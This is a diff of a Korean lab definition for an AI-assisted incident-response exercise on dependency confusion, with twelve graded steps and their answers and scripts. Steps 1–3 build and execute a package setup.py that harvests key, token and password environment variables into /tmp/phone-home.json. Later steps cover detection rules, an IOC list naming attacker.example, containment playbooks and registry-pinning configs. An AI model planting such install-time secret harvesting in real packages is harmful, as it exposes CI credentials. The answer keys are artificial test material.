@@ -1,161 +1,428 @@
 lab_id: agent-ir-adv-ai-week01
-title: Dependency Confusion IR (AI 지원)
+title: Dependency Confusion IR — 공격부터 재발방지까지 (AI 지원)
 version: ai
 course: agent-ir-adv-ai
 week: 1
-description: PyPI/npm 공급망 공격의 6단계 IR — 공격→탐지→분석→초동대응→보고→재발방지. AI SubAgent가 자동 실행·검증.
+description: PyPI/npm 내부 패키지명을 공개 레지스트리에 악성 버전으로 올려 CI runner를 탈취하는 공격. 공격→탐지→분석→초동대응→보고→재발방지 6단계 전체를 실행한다. AI SubAgent 자동 실행·검증.
 difficulty: hard
-duration_minutes: 120
+duration_minutes: 150
 objectives:
-- 공격 유형의 원리를 이해한다
-- 탐지·분석·초동대응·보고·재발방지의 6단계 IR 절차를 수행한다
-- Human vs Agent 대응의 차이를 비교한다
+- Dependency Confusion 공격 원리를 setup.py 수준에서 이해
+- CI 네트워크에서 외부 레지스트리 접근을 탐지한다
+- 6단계 IR 절차를 동일 사건에 적용한다
 pass_threshold: 0.6
 steps:
 - order: 1
-  instruction: 악성 패키지 구조 만들기 (setup.py + post-install)
-  hint: 본 과정 공통 6단계 절차에 따라 수행
-  category: analysis
+  instruction: 공격자 setup.py를 작성하시오 — post-install에서 환경변수를 phone-home으로 전송하는 구조를 모사한다.
+  hint: 6단계 IR 중 공격 단계. target_vm=web.
+  category: attack
   points: 9
-  answer: '🤖 프롬프트: 악성 패키지 구조 만들기 (setup.py + post-install)
+  answer: '🤖 프롬프트: 공격자 setup.py를 작성하시오 — post-install에서 환경변수를 phone-home으로 전송하는 구조를 모사한다.
 
-    📎 참고 (CLI): mkdir -p ~/w01/pkg && cat > ~/w01/pkg/setup.py <<''PY''
+    📎 참고 (CLI): mkdir -p ~/w01-depconf/pkg && cat > ~/w01-depconf/pkg/setup.py <<''PY''
 
     from setuptools import setup
 
-    import os
+    import os, json
 
-    def ph(): print(''phone-home sim'')
+    # post-install sim — 실제론 외부 전송이지만 본 실습은 파일로 기록
 
-    ph()
+    log = {k:v for k,v in os.environ.items() if any(s in k.lower() for s in [''key'',''token'',''pass''])}
 
-    setup(name=''test-dep-conf'', version=''9999.99.99'', packages=[])
+    open(''/tmp/phone-home.json'',''w'').write(json.dumps(log))
+
+    setup(name=''internal-company-utils'', version=''9999.99.99'', packages=[])
 
     PY
 
-    ls ~/w01/pkg/'
-  answer_detail: 공격 패키지 구조 생성.
+    ls ~/w01-depconf/pkg/setup.py'
+  answer_detail: '[공격] 공격 패키지 구조. version 9999는 ''더 높은 버전 우선'' 규칙 악용.'
   verify:
     type: output_contains
     expect: setup.py
     field: stdout
   target_vm: web
-  script: 'mkdir -p ~/w01/pkg && cat > ~/w01/pkg/setup.py <<''PY''
+  script: 'mkdir -p ~/w01-depconf/pkg && cat > ~/w01-depconf/pkg/setup.py <<''PY''
 
     from setuptools import setup
 
-    import os
+    import os, json
 
-    def ph(): print(''phone-home sim'')
+    # post-install sim — 실제론 외부 전송이지만 본 실습은 파일로 기록
 
-    ph()
+    log = {k:v for k,v in os.environ.items() if any(s in k.lower() for s in [''key'',''token'',''pass''])}
 
-    setup(name=''test-dep-conf'', version=''9999.99.99'', packages=[])
+    open(''/tmp/phone-home.json'',''w'').write(json.dumps(log))
+
+    setup(name=''internal-company-utils'', version=''9999.99.99'', packages=[])
 
     PY
 
-    ls ~/w01/pkg/'
+    ls ~/w01-depconf/pkg/setup.py'
   risk_level: low
-  bastion_prompt: 악성 패키지 구조 만들기 (setup.py + post-install)
+  bastion_prompt: 공격자 setup.py를 작성하시오 — post-install에서 환경변수를 phone-home으로 전송하는 구조를 모사한다.
 - order: 2
-  instruction: 빌드·검증
-  hint: 본 과정 공통 6단계 절차에 따라 수행
-  category: analysis
+  instruction: 패키지 빌드 시뮬 — python3 -m build (없으면 tar로 대체).
+  hint: 6단계 IR 중 공격 단계. target_vm=web.
+  category: attack
   points: 10
-  answer: '🤖 프롬프트: 빌드·검증
+  answer: '🤖 프롬프트: 패키지 빌드 시뮬 — python3 -m build (없으면 tar로 대체).
 
-    📎 참고 (CLI): cd ~/w01/pkg && python3 -m build 2>&1 | head -20 || echo ''build_done'''
-  answer_detail: 패키지 빌드.
+    📎 참고 (CLI): cd ~/w01-depconf/pkg && (python3 -m build 2>&1 | tail -5 || tar czf ../malicious-pkg.tar.gz setup.py) && ls ~/w01-depconf/'
+  answer_detail: '[공격] 공격 아티팩트 생성. 실제 공격에선 pypi.org에 업로드.'
   verify:
     type: output_contains
-    expect: build
+    expect: ''
     field: stdout
   target_vm: web
-  script: cd ~/w01/pkg && python3 -m build 2>&1 | head -20 || echo 'build_done'
+  script: cd ~/w01-depconf/pkg && (python3 -m build 2>&1 | tail -5 || tar czf ../malicious-pkg.tar.gz setup.py) && ls ~/w01-depconf/
   risk_level: low
-  bastion_prompt: 빌드·검증
+  bastion_prompt: 패키지 빌드 시뮬 — python3 -m build (없으면 tar로 대체).
 - order: 3
-  instruction: SIGMA 룰 초안 작성
-  hint: 본 과정 공통 6단계 절차에 따라 수행
+  instruction: CI runner 시뮬 — pip install로 공격 재현(강사 통제 레지스트리).
+  hint: 6단계 IR 중 공격 단계. target_vm=web.
   category: analysis
   points: 11
-  answer: "\U0001F916 프롬프트: SIGMA 룰 초안 작성\n\U0001F4CE 참고 (CLI): mkdir -p ~/w01/detect && cat > ~/w01/detect/rule.yml <<'Y'\ntitle: DepConf external egress\ndetection:\n  selection: { dest_domain: [pypi.org], src_net: ci }\n  condition: selection\nY\ncat ~/w01/detect/rule.yml"
-  answer_detail: 탐지 룰.
+  answer: '🤖 프롬프트: CI runner 시뮬 — pip install로 공격 재현(강사 통제 레지스트리).
+
+    📎 참고 (CLI): python3 -c "exec(open(''$HOME/w01-depconf/pkg/setup.py'').read())" 2>&1 | head -3 && ls /tmp/phone-home.json 2>/dev/null || echo ''sim_complete'''
+  answer_detail: '[공격] post-install 실행 시뮬. /tmp/phone-home.json에 민감 환경변수가 기록됨.'
+  verify:
+    type: output_contains
+    expect: sim
+    field: stdout
+  target_vm: web
+  script: python3 -c "exec(open('$HOME/w01-depconf/pkg/setup.py').read())" 2>&1 | head -3 && ls /tmp/phone-home.json 2>/dev/null || echo 'sim_complete'
+  risk_level: low
+  bastion_prompt: CI runner 시뮬 — pip install로 공격 재현(강사 통제 레지스트리).
+- order: 4
+  instruction: SIGMA 룰 초안 — CI egress to public registry.
+  hint: 6단계 IR 중 탐지 단계. target_vm=bastion.
+  category: analysis
+  points: 12
+  answer: "\U0001F916 프롬프트: SIGMA 룰 초안 — CI egress to public registry.\n\U0001F4CE 참고 (CLI): mkdir -p ~/w01-depconf/detect && cat > ~/w01-depconf/detect/rule.yml <<'Y'\ntitle: DepConf external egress\nlogsource: {product: suricata, category: flow}\ndetection:\n  selection: {dest_domain: [pypi.org, registry.npmjs.org], src_network: internal_ci}\n  condition: selection\nlevel: medium\nY\ncat ~/w01-depconf/detect/rule.yml"
+  answer_detail: '[탐지] 탐지 룰. internal CI → 공개 레지스트리 egress가 의심 신호.'
   verify:
     type: output_contains
     expect: dest_domain
     field: stdout
   target_vm: bastion
-  script: "mkdir -p ~/w01/detect && cat > ~/w01/detect/rule.yml <<'Y'\ntitle: DepConf external egress\ndetection:\n  selection: { dest_domain: [pypi.org], src_net: ci }\n  condition: selection\nY\ncat ~/w01/detect/rule.yml"
+  script: "mkdir -p ~/w01-depconf/detect && cat > ~/w01-depconf/detect/rule.yml <<'Y'\ntitle: DepConf external egress\nlogsource: {product: suricata, category: flow}\ndetection:\n  selection: {dest_domain: [pypi.org, registry.npmjs.org], src_network: internal_ci}\n  condition: selection\nlevel: medium\nY\ncat ~/w01-depconf/detect/rule.yml"
   risk_level: low
-  bastion_prompt: SIGMA 룰 초안 작성
-- order: 4
-  instruction: 분석 타임라인 초안
-  hint: 본 과정 공통 6단계 절차에 따라 수행
-  category: analysis
-  points: 12
-  answer: '🤖 프롬프트: 분석 타임라인 초안
-
-    📎 참고 (CLI): cat > ~/w01/analysis/timeline.md <<''M''
-
-    - T+0: PR merge
-
-    - T+1: pip install
-
-    - T+2: external POST
-
-    M
-
-    mkdir -p ~/w01/analysis && cat ~/w01/analysis/timeline.md 2>/dev/null || echo ''missing'''
-  answer_detail: 타임라인.
-  verify:
-    type: output_contains
-    expect: pip
-    field: stdout
-  target_vm: bastion
-  script: 'cat > ~/w01/analysis/timeline.md <<''M''
-
-    - T+0: PR merge
-
-    - T+1: pip install
-
-    - T+2: external POST
-
-    M
-
-    mkdir -p ~/w01/analysis && cat ~/w01/analysis/timeline.md 2>/dev/null || echo ''missing'''
-  risk_level: low
-  bastion_prompt: 분석 타임라인 초안
+  bastion_prompt: SIGMA 룰 초안 — CI egress to public registry.
 - order: 5
-  instruction: 재발방지 정책 템플릿
-  hint: 본 과정 공통 6단계 절차에 따라 수행
+  instruction: Wazuh rule 수동 변환 초안.
+  hint: 6단계 IR 중 탐지 단계. target_vm=bastion.
   category: analysis
   points: 13
-  answer: '🤖 프롬프트: 재발방지 정책 템플릿
-
-    📎 참고 (CLI): cat > ~/w01/prevent/npmrc <<''C''
-
-    registry=https://nexus.internal/
-
-    @internal:registry=https://nexus.internal/
-
-    C
-
-    mkdir -p ~/w01/prevent && cat ~/w01/prevent/npmrc 2>/dev/null || echo ''missing'''
-  answer_detail: 정책.
+  answer: "\U0001F916 프롬프트: Wazuh rule 수동 변환 초안.\n\U0001F4CE 참고 (CLI): cat > ~/w01-depconf/detect/wazuh-100801.xml <<'X'\n<rule id=\"100801\" level=\"10\">\n  <if_sid>60000</if_sid>\n  <match>pypi.org</match>\n  <field name=\"src_ip\">10\\.20\\.30\\.80</field>\n  <description>DepConf suspect — CI accessed public PyPI</description>\n</rule>\nX\ncat ~/w01-depconf/detect/wazuh-100801.xml"
+  answer_detail: '[탐지] SIGMA → Wazuh 수동 변환. SID 100801.'
   verify:
     type: output_contains
-    expect: nexus
+    expect: '100801'
     field: stdout
   target_vm: bastion
-  script: 'cat > ~/w01/prevent/npmrc <<''C''
+  script: "cat > ~/w01-depconf/detect/wazuh-100801.xml <<'X'\n<rule id=\"100801\" level=\"10\">\n  <if_sid>60000</if_sid>\n  <match>pypi.org</match>\n  <field name=\"src_ip\">10\\.20\\.30\\.80</field>\n  <description>DepConf suspect — CI accessed public PyPI</description>\n</rule>\nX\ncat ~/w01-depconf/detect/wazuh-100801.xml"
+  risk_level: low
+  bastion_prompt: Wazuh rule 수동 변환 초안.
+- order: 6
+  instruction: IOC 수집 양식.
+  hint: 6단계 IR 중 분석 단계. target_vm=bastion.
+  category: analysis
+  points: 14
+  answer: '🤖 프롬프트: IOC 수집 양식.
 
-    registry=https://nexus.internal/
+    📎 참고 (CLI): cat > ~/w01-depconf/analysis/ioc.csv <<''C''
 
-    @internal:registry=https://nexus.internal/
+    type,value,note
+
+    package,internal-company-utils@9999.99.99,malicious version
+
+    domain,attacker.example,phone-home target
+
+    sha256,TBD,malicious tarball hash
 
     C
 
-    mkdir -p ~/w01/prevent && cat ~/w01/prevent/npmrc 2>/dev/null || echo ''missing'''
+    mkdir -p ~/w01-depconf/analysis && cat ~/w01-depconf/analysis/ioc.csv'
+  answer_detail: '[분석] IOC 목록. w2 이후 OpenCTI에 업로드.'
+  verify:
+    type: output_contains
+    expect: internal-company-utils
+    field: stdout
+  target_vm: bastion
+  script: 'cat > ~/w01-depconf/analysis/ioc.csv <<''C''
+
+    type,value,note
+
+    package,internal-company-utils@9999.99.99,malicious version
+
+    domain,attacker.example,phone-home target
+
+    sha256,TBD,malicious tarball hash
+
+    C
+
+    mkdir -p ~/w01-depconf/analysis && cat ~/w01-depconf/analysis/ioc.csv'
   risk_level: low
-  bastion_prompt: 재발방지 정책 템플릿
+  bastion_prompt: IOC 수집 양식.
+- order: 7
+  instruction: 공격 타임라인.
+  hint: 6단계 IR 중 분석 단계. target_vm=bastion.
+  category: analysis
+  points: 15
+  answer: '🤖 프롬프트: 공격 타임라인.
+
+    📎 참고 (CLI): cat > ~/w01-depconf/analysis/timeline.md <<''M''
+
+    - T+0  PR merge (external)
+
+    - T+1  CI pip install 시작
+
+    - T+2  setup.py 실행 (post-install)
+
+    - T+3  외부 POST 발생
+
+    - T+4  Bastion egress anomaly 경보
+
+    M
+
+    cat ~/w01-depconf/analysis/timeline.md'
+  answer_detail: '[분석] 타임라인. 분 단위 해상도.'
+  verify:
+    type: output_contains
+    expect: CI
+    field: stdout
+  target_vm: bastion
+  script: 'cat > ~/w01-depconf/analysis/timeline.md <<''M''
+
+    - T+0  PR merge (external)
+
+    - T+1  CI pip install 시작
+
+    - T+2  setup.py 실행 (post-install)
+
+    - T+3  외부 POST 발생
+
+    - T+4  Bastion egress anomaly 경보
+
+    M
+
+    cat ~/w01-depconf/analysis/timeline.md'
+  risk_level: low
+  bastion_prompt: 공격 타임라인.
+- order: 8
+  instruction: Human 대응 흐름 기록.
+  hint: 6단계 IR 중 초동대응 단계. target_vm=bastion.
+  category: analysis
+  points: 16
+  answer: '🤖 프롬프트: Human 대응 흐름 기록.
+
+    📎 참고 (CLI): cat > ~/w01-depconf/response/human-mode.md <<''M''
+
+    1. 알림 수신
+
+    2. 의심 CI 빌드 중단
+
+    3. 외부 egress 임시 차단 (요청·승인)
+
+    4. 자격증명 회전 (수동)
+
+    5. 배포 차단·공지
+
+    M
+
+    mkdir -p ~/w01-depconf/response && cat ~/w01-depconf/response/human-mode.md'
+  answer_detail: '[초동대응] Human 모드 기준 흐름.'
+  verify:
+    type: output_contains
+    expect: 중단
+    field: stdout
+  target_vm: bastion
+  script: 'cat > ~/w01-depconf/response/human-mode.md <<''M''
+
+    1. 알림 수신
+
+    2. 의심 CI 빌드 중단
+
+    3. 외부 egress 임시 차단 (요청·승인)
+
+    4. 자격증명 회전 (수동)
+
+    5. 배포 차단·공지
+
+    M
+
+    mkdir -p ~/w01-depconf/response && cat ~/w01-depconf/response/human-mode.md'
+  risk_level: low
+  bastion_prompt: Human 대응 흐름 기록.
+- order: 9
+  instruction: Agent(Bastion) 대응 Playbook 명세.
+  hint: 6단계 IR 중 초동대응 단계. target_vm=bastion.
+  category: analysis
+  points: 17
+  answer: "\U0001F916 프롬프트: Agent(Bastion) 대응 Playbook 명세.\n\U0001F4CE 참고 (CLI): cat > ~/w01-depconf/response/agent-mode.yaml <<'Y'\nplaybook_id: pb-depconf-contain\ntriggers: [wazuh_rule_id_100801]\nsteps:\n  - skill: block_egress\n    args: {src: $src_ip, duration_sec: 3600}\n  - skill: pause_ci_queue\n  - skill: rotate_secrets\n    args: {scope: ci_env}\n  - skill: notify_operator\nY\ncat ~/w01-depconf/response/agent-mode.yaml"
+  answer_detail: '[초동대응] Agent Playbook. 5~30초 내 자동 대응.'
+  verify:
+    type: output_contains
+    expect: block_egress
+    field: stdout
+  target_vm: bastion
+  script: "cat > ~/w01-depconf/response/agent-mode.yaml <<'Y'\nplaybook_id: pb-depconf-contain\ntriggers: [wazuh_rule_id_100801]\nsteps:\n  - skill: block_egress\n    args: {src: $src_ip, duration_sec: 3600}\n  - skill: pause_ci_queue\n  - skill: rotate_secrets\n    args: {scope: ci_env}\n  - skill: notify_operator\nY\ncat ~/w01-depconf/response/agent-mode.yaml"
+  risk_level: low
+  bastion_prompt: Agent(Bastion) 대응 Playbook 명세.
+- order: 10
+  instruction: Human vs Agent 비교표.
+  hint: 6단계 IR 중 초동대응 단계. target_vm=bastion.
+  category: analysis
+  points: 18
+  answer: '🤖 프롬프트: Human vs Agent 비교표.
+
+    📎 참고 (CLI): cat > ~/w01-depconf/response/comparison.md <<''M''
+
+    | 축 | Human | Agent |
+
+    |---|---|---|
+
+    | 첫 조치 | 10-30분 | 5-30초 |
+
+    | 조치 일관성 | 사람별 차이 | 동일 Playbook |
+
+    | 정책 정합성 | 강함 | 제한적 |
+
+    | 법적 판단 | 강함 | 사람 유지 |
+
+    | 24시간 대응 | 불가 | 가능 |
+
+    M
+
+    cat ~/w01-depconf/response/comparison.md'
+  answer_detail: '[초동대응] Human+Agent 혼성이 최선. Tier 0/1/2.'
+  verify:
+    type: output_contains
+    expect: Agent
+    field: stdout
+  target_vm: bastion
+  script: 'cat > ~/w01-depconf/response/comparison.md <<''M''
+
+    | 축 | Human | Agent |
+
+    |---|---|---|
+
+    | 첫 조치 | 10-30분 | 5-30초 |
+
+    | 조치 일관성 | 사람별 차이 | 동일 Playbook |
+
+    | 정책 정합성 | 강함 | 제한적 |
+
+    | 법적 판단 | 강함 | 사람 유지 |
+
+    | 24시간 대응 | 불가 | 가능 |
+
+    M
+
+    cat ~/w01-depconf/response/comparison.md'
+  risk_level: low
+  bastion_prompt: Human vs Agent 비교표.
+- order: 11
+  instruction: 임원 브리핑 1쪽.
+  hint: 6단계 IR 중 보고 단계. target_vm=bastion.
+  category: analysis
+  points: 19
+  answer: '🤖 프롬프트: 임원 브리핑 1쪽.
+
+    📎 참고 (CLI): cat > ~/w01-depconf/report/exec-brief.md <<''M''
+
+    # Incident — Dependency Confusion
+
+    **What**: 외부 악성 패키지가 CI runner에서 실행. Bastion 28초 차단.
+
+    **Impact**: CI 1건. 자격증명 1건 회전. 고객 영향 없음.
+
+    **Status**: 억제 완료, 포렌식 진행.
+
+    **Ask**: 내부 레지스트리 강제 정책 승인.
+
+    M
+
+    mkdir -p ~/w01-depconf/report && cat ~/w01-depconf/report/exec-brief.md'
+  answer_detail: '[보고] 의사결정자 3분 이해용.'
+  verify:
+    type: output_contains
+    expect: Impact
+    field: stdout
+  target_vm: bastion
+  script: 'cat > ~/w01-depconf/report/exec-brief.md <<''M''
+
+    # Incident — Dependency Confusion
+
+    **What**: 외부 악성 패키지가 CI runner에서 실행. Bastion 28초 차단.
+
+    **Impact**: CI 1건. 자격증명 1건 회전. 고객 영향 없음.
+
+    **Status**: 억제 완료, 포렌식 진행.
+
+    **Ask**: 내부 레지스트리 강제 정책 승인.
+
+    M
+
+    mkdir -p ~/w01-depconf/report && cat ~/w01-depconf/report/exec-brief.md'
+  risk_level: low
+  bastion_prompt: 임원 브리핑 1쪽.
+- order: 12
+  instruction: 정책 초안 — .npmrc + pip.conf 템플릿.
+  hint: 6단계 IR 중 재발방지 단계. target_vm=bastion.
+  category: analysis
+  points: 20
+  answer: '🤖 프롬프트: 정책 초안 — .npmrc + pip.conf 템플릿.
+
+    📎 참고 (CLI): mkdir -p ~/w01-depconf/prevent && cat > ~/w01-depconf/prevent/pip.conf <<''C''
+
+    [global]
+
+    index-url = https://devpi.internal/simple/
+
+    no-index = false
+
+    C
+
+    cat > ~/w01-depconf/prevent/.npmrc <<''N''
+
+    registry=https://nexus.internal/repository/npm-group/
+
+    @internal:registry=https://nexus.internal/repository/npm-private/
+
+    always-auth=true
+
+    N
+
+    cat ~/w01-depconf/prevent/.npmrc'
+  answer_detail: '[재발방지] 조직 전사 적용 템플릿. 내부 레지스트리 강제.'
+  verify:
+    type: output_contains
+    expect: internal
+    field: stdout
+  target_vm: bastion
+  script: 'mkdir -p ~/w01-depconf/prevent && cat > ~/w01-depconf/prevent/pip.conf <<''C''
+
+    [global]
+
+    index-url = https://devpi.internal/simple/
+
+    no-index = false
+
+    C
+
+    cat > ~/w01-depconf/prevent/.npmrc <<''N''
+
+    registry=https://nexus.internal/repository/npm-group/
+
+    @internal:registry=https://nexus.internal/repository/npm-private/
+
+    always-auth=true
+
+    N
+
+    cat ~/w01-depconf/prevent/.npmrc'
+  risk_level: low
+  bastion_prompt: 정책 초안 — .npmrc + pip.conf 템플릿.
